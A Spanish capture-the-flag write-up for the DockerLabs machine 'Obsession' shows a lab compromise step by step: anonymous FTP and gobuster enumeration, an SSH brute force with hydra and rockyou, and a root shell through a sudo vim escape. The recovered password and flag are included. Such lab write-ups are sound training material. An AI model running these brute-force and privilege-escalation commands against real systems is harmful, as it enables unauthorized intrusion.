# Obsession - DockerLabs

## Resumen
Máquina de nivel "Muy Fácil" de DockerLabs que explota un login anónimo en FTP, enumeración web, fuerza bruta SSH y una mala configuración de sudo con Vim para escalar a root.

## Reconocimiento
- **Escaneo de puertos**: `nmap -p- --min-rate 5000 -T4 -v 172.17.0.2`
- **Puertos abiertos**: 21/tcp (FTP), 22/tcp (SSH), 80/tcp (HTTP)
- **Servicios**: vsftpd 3.0.5, OpenSSH 9.6p1, Apache httpd 2.4.58

## Enumeración
- **FTP Anónimo**: Descargué `chat-gonza.txt` y `pendientes.txt`, obteniendo pistas sobre el usuario `russoski`.
- **Web (Gobuster)**: Encontré `/backup/` y `/important/`. En `backup.txt` vi la pista: *"Para todos mis servicios: russoski (cambiar pronto!)"*.

## Explotación
- **Fuerza Bruta SSH**: `hydra -l russoski -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.17.0.2` → Contraseña: `iloveme`
- **Acceso SSH**: `ssh russoski@172.17.0.2`

## Escalada de Privilegios
- **Sudo**: `sudo -l` mostró `(root) NOPASSWD: /usr/bin/vim`
- **Explotación de Vim**: `sudo vim -c ':!/bin/sh'` → Shell como root.

## Flags
- **root.txt**: `aac0a9daa4185875786c9ed154f0dece`
- **Usuario**: `russoski` / Contraseña: `iloveme`

## Evidencia
<img width="1006" height="200" alt="image" src="https://github.com/user-attachments/assets/6957f247-0544-4a6d-b7fd-ac2c22c8e58c" />
